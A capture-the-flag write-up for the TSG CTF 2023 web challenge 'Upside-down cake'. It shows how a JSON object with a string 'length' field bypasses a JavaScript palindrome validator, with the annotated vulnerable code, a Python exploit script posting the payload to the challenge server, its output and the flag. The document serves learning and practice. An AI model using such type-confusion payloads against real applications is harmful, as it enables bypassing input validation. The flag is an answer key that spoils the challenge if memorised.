# TSG CTF 2023 - web/Upside-down cake

- 127 solves / 100 pts
- Author: hakatashi

You need to send a palindrome with `> 1000` characters to solve this challenge, but request body size is limited by nginx.

I solved this challenge by sending a crafted JSON like the following.


```JSON
{"palindrome": {"length": "1000", "0": "", "999": ""}}
```

See the explaination below for how the payload works.

```javascript
const validatePalindrome = (string) => {
	// "1000" < 1000 is true
	if (string.length < 1000) {
		return 'too short';
	}

	// Array("1000") is ["1000"]
	for (const i of Array(string.length).keys()) {
		const original = string[i];  // i=0
		const reverse = string[string.length - i - 1];  // "1000" - 0 - 1 is 999

		if (original !== reverse || typeof original !== 'string') {
			return 'not palindrome';
		}
	}

	return null;
}
```

## Exploit

```python
import requests

url = "http://34.84.176.251:12349/"

payload = {"palindrome": {"length": "1000", "0": "", "999": ""}}

res = requests.post(url, json=payload)

print(res.text)
```

```
$ py solve.py
I love you! Flag is TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}
```

## Flag

```
TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}
```
